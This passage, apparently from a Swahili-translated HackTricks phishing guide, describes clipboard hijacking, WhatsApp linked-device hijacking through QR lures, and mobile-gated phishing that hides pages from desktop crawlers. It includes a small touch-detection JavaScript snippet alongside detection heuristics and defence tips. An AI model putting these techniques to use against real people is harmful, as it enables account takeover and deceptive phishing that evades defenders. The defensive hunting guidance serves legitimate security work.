Washambulizi wanaweza kwa siri kunakili amri hasidi kwenye clipboard ya mwathiriwa kutoka kwa ukurasa wa wavuti uliodhibitiwa au uliotumia typosquatting na kisha kumdanganya mtumiaji ili azi-paste ndani ya dirisha la **Win + R**, **Win + X** au terminal, na kutekeleza code yoyote bila download au attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Ukurasa wa lure (mfano, fake ministry/CERT “channel”) huonyesha WhatsApp Web/Desktop QR na humwagiza mwathiriwa kuiscan, hivyo huongeza kimyakimya mshambulizi kama **linked device**.
* Mshambulizi hupata mara moja uonekano wa chat/contact hadi session iondolewe. Waathiriwa baadaye wanaweza kuona notification ya “new device linked”; defenders wanaweza kutafuta matukio yasiyotarajiwa ya device-link muda mfupi baada ya kutembelea kurasa za QR zisizoaminika.

### Mobile‑gated phishing to evade crawlers/sandboxes
Waendeshaji wanaongeza kwa sasa vizuizi kwenye phishing flows zao nyuma ya simple device check ili desktop crawlers wasifike kwenye final pages. Mfano wa kawaida ni script ndogo inayojaribu kama DOM ina touch-capable na hutuma result kwenye server endpoint; non‑mobile clients hupokea HTTP 500 (au blank page), huku mobile users wakipewa full flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia za server mara nyingi huonekana:
- Huweka session cookie wakati wa first load.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GETs zinazofuata wakati `is_mobile=false`; hutoa phishing pekee ikiwa `true`.

Heuristics za hunting na detection:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non-mobile; legitimate mobile victim paths hurejesha 200 pamoja na follow-on HTML/JS.
- Zuia au kagua kwa makini pages zinazoweka content hali yao pekee kulingana na `ontouchstart` au device checks zinazofanana.

Vidokezo vya defence:
- Execute crawlers kwa mobile-like fingerprints na JS enabled ili kufichua gated content.
- Toa alert kwa suspicious 500 responses zinazofuata `POST /detect` kwenye newly registered domains.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
